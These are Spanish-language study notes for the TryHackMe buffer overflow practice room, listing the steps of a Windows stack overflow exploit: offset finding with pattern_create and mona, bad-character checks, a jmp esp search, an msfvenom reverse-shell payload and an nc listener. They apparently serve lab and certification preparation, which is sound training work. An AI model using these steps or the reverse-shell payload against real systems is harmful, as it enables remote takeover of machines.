-------------------------------------------
# BUFFER OVERFLOW 
https://tryhackme.com/room/bufferoverflowprep  https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

## Con Immunity Debugger y !mona

		!mona config -set workingfolder c:\mona\%p
fuzzer.py -> calcular offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l offset+400 >> exploit.py/payload
exploit.py 
		!mona findmsp -distance <offset> >> offset real en EIP
exploit.py <- cambiar el payload al de bytearray.py y offset al de arriba
		!mona bytearray -b "\x00"
		!mona compare -f c:\mona\oscp\bytearray.bin -a <direccion ESP> -> \x00 + badchars (en los consecutivos, solo suele importar el primero)

payload = msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -b "<BADCHARS>" -f py
retn = 	!mona jmp -r esp -cpb "\x00\x8c\xae\xbe\xfb"
padding = "\x90" * 16 (4 nops)
exploit.py -> añadir todo lo de arriba
nc -nlvp 4444 (en otra consola)
python exploit.py